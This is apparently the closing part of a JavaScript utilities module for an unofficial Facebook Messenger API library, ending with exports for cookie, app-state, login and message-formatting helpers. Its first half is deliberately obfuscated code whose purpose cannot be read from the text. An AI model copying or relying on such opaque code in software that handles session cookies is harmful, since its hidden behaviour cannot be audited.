_0x3b2c83[_0xd1db78(0x12a)](getAll)){if(_0x3b2c83[_0x2143fe(0xd4)](_0x3b2c83[_0x3ce8b8(0x6d)],_0x3b2c83[_0x3e3809(0x6d)])){if(_0x3b2c83[_0x2143fe(0x154)](_0xb124f8[_0x2143fe(0xa4)][_0x3f3329(0x195)+_0x3ce8b8(0xc6)],undefined)){if(_0x3b2c83[_0x2143fe(0x160)](_0x3b2c83[_0x3f3329(0xc2)],_0x3b2c83[_0x3f3329(0x102)]))_0x5c4bdd[_0x3f3329(0xbe)](_0xb124f8[_0xd1db78(0xa4)][_0x2143fe(0x195)+_0xd1db78(0xc6)]);else{if(_0x15b31[_0x3e3809(0x179)][_0x3b2c83[_0xd1db78(0x17c)]])_0x3b2c83[_0x3e3809(0x158)](_0x4abe83,_0x5950d3[_0xd1db78(0x133)+_0x3ce8b8(0xb2)+_0x3e3809(0x113)],_0x3b2c83[_0xd1db78(0x11d)]),_0x39cf20=_0x3ebdf6[_0x3e3809(0xbb)+_0x3ce8b8(0x114)+'te'](_0x5099d6[_0x2143fe(0x108)+_0xd1db78(0x13f)](_0x52441b),_0x1db61e[_0x3e3809(0x179)][_0x3b2c83[_0x3ce8b8(0x17c)]]);else return _0x459c1f;}}else continue;}else{var _0x6c346a=_0x3b2c83[_0x3ce8b8(0xc3)][_0x3e3809(0x122)]('|'),_0xdbe4b2=-0x14b*-0x6+0x833+-0xff5;while(!![]){switch(_0x6c346a[_0xdbe4b2++]){case'0':_0x422304[_0x3f3329(0xd9)](_0x3b2c83[_0x3e3809(0x145)],![]);continue;case'1':_0x3b2c83[_0x2143fe(0x172)](_0x4b1370,_0x3b2c83[_0x3f3329(0x109)]);continue;case'2':_0x18df4a[_0x3e3809(0x89)+'ng'][_0x3e3809(0xd9)](_0x3b2c83[_0x3e3809(0x14b)],!![]);continue;case'3':_0x47e0f5[_0x3ce8b8(0xd9)](_0x3b2c83[_0x3e3809(0x150)],'');continue;case'4':_0x1ec9c2[_0xd1db78(0x89)+'ng'][_0xd1db78(0xd9)](_0x3b2c83[_0x2143fe(0x166)],![]);continue;}break;}}}_0x3b2c83[_0x3f3329(0xf3)](deleteAll,_0x5c4bdd);}else _0x36a78c=_0x476898;}}}else _0x3bc971[_0x3f3329(0x178)](_0x1f295c);}break;case![]:{}break;}}catch(_0x22c626){console[_0x3f3329(0x178)](_0x22c626);}};logger(getText[bfwhbjwdwd_0x4dc06a(0x125)+'xt'](Language[bfwhbjwdwd_0x4dc06a(0xc7)+bfwhbjwdwd_0x4599d4(0x6a)+'e'],''+prettyMilliseconds(Date[bfwhbjwdwd_0x202ae7(0x17d)]()-global[bfwhbjwdwd_0x5899f1(0xd2)+bfwhbjwdwd_0x4dc06a(0xf8)])),bfwhbjwdwd_0x5899f1(0xe5)+bfwhbjwdwd_0x2a23e1(0x107)+']');return data;
}

module.exports = {
    isReadableStream:isReadableStream,
    get:get,
    post:post,
    postFormData:postFormData,
    generateThreadingID:generateThreadingID,
    generateOfflineThreadingID:generateOfflineThreadingID,
    getGUID:getGUID,
    getFrom:getFrom,
    makeParsable:makeParsable,
    arrToForm:arrToForm,
    getSignatureID:getSignatureID,
    getJar: request.jar,
    generateTimestampRelative:generateTimestampRelative,
    makeDefaults:makeDefaults,
    parseAndCheckLogin:parseAndCheckLogin,
    getGender: getGenderByPhysicalMethod,
    saveCookies,
    getType,
    _formatAttachment,
    formatHistoryMessage,
    formatID,
    formatMessage,
    formatDeltaEvent,
    formatDeltaMessage,
    formatProxyPresence,
    formatPresence,
    formatTyp,
    formatDeltaReadReceipt,
    formatCookie,
    formatThread,
    formatReadReceipt,
    formatRead,
    generatePresence,
    generateAccessiblityCookie,
    formatDate,
    decodeClientPayload,
    getAppState,
    getAdminTextMessageType,
    setProxy
};